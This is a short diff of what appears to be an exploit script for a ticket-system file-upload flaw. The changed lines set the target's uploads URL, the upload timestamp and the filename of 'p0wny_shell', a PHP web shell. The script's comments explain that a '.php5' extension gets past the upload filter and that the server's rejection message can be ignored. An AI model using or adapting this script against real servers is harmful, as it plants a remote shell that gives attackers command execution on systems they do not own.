@@ -32,9 +32,9 @@ Content-Type: text/html
 # full filename: p0wny_shell.txt.php5
 # http POST resp date / base url / file / ext 
 # you will recieve: "File is not allowed." - disregard that bullshit
-d = '25.01.2019 01:15:03'
-b = "http://192.168.0.3/uploads/tickets/"
-f = "p0wny_shell.txt.php5"
+d = '25.01.2019 02:06:10'
+b = "http://target/support/uploads/tickets/"
+f = "p0wny_shell.php5"
 
 # @@@ no "." 
 e = "php5"
